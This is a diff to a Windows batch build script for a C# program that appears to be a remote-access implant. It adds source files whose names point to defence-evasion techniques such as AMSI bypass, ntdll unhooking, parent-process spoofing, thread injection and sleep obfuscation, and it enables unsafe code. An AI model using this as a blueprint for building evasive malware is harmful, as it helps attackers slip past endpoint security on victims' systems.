@@ -34,7 +34,9 @@ REM ── Source files ──────────────────�
 set SOURCES=Program.cs Config.cs DynInvoke.cs Connection.cs Shell.cs ^
     IShellStream.cs Crypto.cs TlsStream.cs FileTransfer.cs ScanPatch.cs ^
     AesCrypto.cs EnvCheck.cs PayloadRunner.cs Syscall.cs ^
-    RemoteLoader.cs Cleanup.cs
+    RemoteLoader.cs Cleanup.cs Stager.cs AsmExec.cs AssemblyRunner.cs ^
+    NtdllUnhook.cs AmsiHwBp.cs PpidSpoof.cs ThreadInjector.cs ^
+    SleepObfuscation.cs
 
 REM ── References (GAC assemblies) ──────────────────────────
 set REFS=/reference:System.dll /reference:System.Core.dll ^
@@ -42,7 +44,7 @@ set REFS=/reference:System.dll /reference:System.Core.dll ^
     /reference:System.Security.dll
 
 REM ── Compiler flags ───────────────────────────────────────
-set FLAGS=/target:exe /platform:anycpu /nologo /utf8output
+set FLAGS=/target:exe /platform:anycpu /nologo /utf8output /unsafe
 
 if /I "%CONFIG%"=="Debug" (
     set FLAGS=%FLAGS% /debug+ /define:DEBUG
